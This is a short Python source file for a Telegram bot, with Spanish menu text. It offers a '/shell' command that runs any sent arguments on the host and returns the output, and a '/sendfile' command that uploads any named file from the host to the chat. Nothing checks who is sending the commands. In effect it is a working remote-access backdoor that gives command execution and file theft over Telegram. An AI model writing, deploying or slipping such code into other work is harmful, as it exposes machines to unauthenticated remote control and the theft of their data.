import subprocess
from telegram.ext import Updater
updater = Updater(token='TOKEN', use_context=True)
dispatcher = updater.dispatcher
import logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',level=logging.INFO)
def start(update, context):
     context.bot.send_message(chat_id=update.effective_chat.id, text="Opciones\n /shell arg (basic shell)\n /sendfile arg (para cojer archivos)")
def shell(update,context):
	
         ext=subprocess.run(context.args,capture_output=True)
         context.bot.send_message(chat_id=update.effective_chat.id, text=str(ext.stdout.decode("UTF-8")))


def sendFile(update,context):
	chat_id=update.effective_chat.id
	context.bot.send_document(chat_id=chat_id ,document=open(context.args[0],'rb'))
from telegram.ext import CommandHandler
start_handler = CommandHandler('start', start)
dispatcher.add_handler(start_handler)
shell_handler = CommandHandler('shell',shell)
dispatcher.add_handler(shell_handler)
start_handler = CommandHandler('sendfile', sendFile)
dispatcher.add_handler(start_handler)
updater.start_polling()


